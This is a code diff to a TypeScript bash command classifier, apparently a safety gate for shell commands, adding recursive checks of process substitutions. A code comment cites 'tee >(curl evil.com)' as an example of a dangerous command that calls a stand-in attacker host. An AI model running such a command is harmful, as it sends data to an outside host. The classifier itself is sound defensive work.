@@ -3,7 +3,7 @@
 // Orchestrates the full bash command classification pipeline:
 // extractStages -> classify each stage -> check composition -> aggregate.
 
-import { extractStages } from "./ast-walk.js";
+import { extractProcessSubs, extractStages } from "./ast-walk.js";
 import { classifyTokens, SHELL_WRAPPERS, getPolicy, FILESYSTEM_WRITE, LANG_EXEC } from "./taxonomy.js";
 import { classifyWithFlags, stripGitGlobalFlags, extractGitDirPaths } from "./classify.js";
 import { checkComposition } from "./composition.js";
@@ -165,7 +165,10 @@ export function classifyCommand(command: string, depth = 0, config?: ShushConfig
     };
   }
 
-  const stages = extractStages(command);
+  // Extract process substitutions >(cmd)/<(cmd) before parsing.
+  // Inner commands are classified separately and composed into the result.
+  const { cleaned, subs } = extractProcessSubs(command);
+  const stages = extractStages(cleaned);
 
   // Shell unwrapping: if the entire command is `bash -c '...'`, classify the inner command.
   if (
@@ -265,6 +268,18 @@ export function classifyCommand(command: string, depth = 0, config?: ShushConfig
   if (compDecision) {
     finalDecision = stricter(finalDecision, compDecision);
     reason = compReason;
+  }
+
+  // Classify inner commands from process substitutions and compose decisions.
+  // A dangerous inner command (e.g. tee >(curl evil.com)) must escalate.
+  if (depth < MAX_UNWRAP_DEPTH) {
+    for (const sub of subs) {
+      const subResult = classifyCommand(sub, depth + 1, config);
+      if (subResult.finalDecision !== "allow") {
+        finalDecision = stricter(finalDecision, subResult.finalDecision);
+        reason = subResult.reason;
+      }
+    }
   }
 
   return {
